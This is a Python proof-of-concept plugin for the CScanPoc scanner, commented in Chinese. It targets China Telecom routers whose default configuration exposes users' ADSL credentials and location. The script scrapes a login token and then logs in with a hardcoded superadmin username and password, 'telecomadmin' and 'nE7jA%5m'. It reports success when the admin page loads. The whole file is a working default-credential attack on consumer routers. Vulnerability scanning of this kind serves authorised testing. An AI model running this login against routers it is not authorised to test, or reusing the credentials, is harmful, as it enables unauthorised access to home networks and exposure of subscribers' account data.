# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Chinatelecom_0001'  # 平台漏洞编号，留空
    name = '电信路由器 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-01-21'  # 漏洞公布时间
    desc = '''
        中国电信路由器默认配置不当导致用户ADSL账号密码及物理位置泄露。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '电信路由器'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '300bd6b8-b15c-44dc-9036-02ab23a50a67'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2014-049406
            hh = hackhttp.hackhttp()
            arg = self.target
            # get the Frm_Logintoken
            code1, head1, res1, errcode1, finalurl1 = hh.http(arg)
            partten = re.compile(
                'document\.getElementById\("Frm_Logintoken"\).value = "(\d{5,8})";')
            match = partten.search(res1)
            Frm_Logintoken = ""
            if match:
                Frm_Logintoken = match.group(1)
            url1 = arg + "/getpage.gch?pid=1001&logout=1"
            data = "Username=telecomadmin&Password=nE7jA%255m&Frm_Logintoken=" + Frm_Logintoken
            # proxy=('127.0.0.1',8080)
            code, head, res, errcode, finalurl = hh.http(arg, post=data)
            if code == 200 and "src=\"template.gch\"" in res:
                # security_hole("电信路由器配置不当，存在超级管理员账号登陆"+arg)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
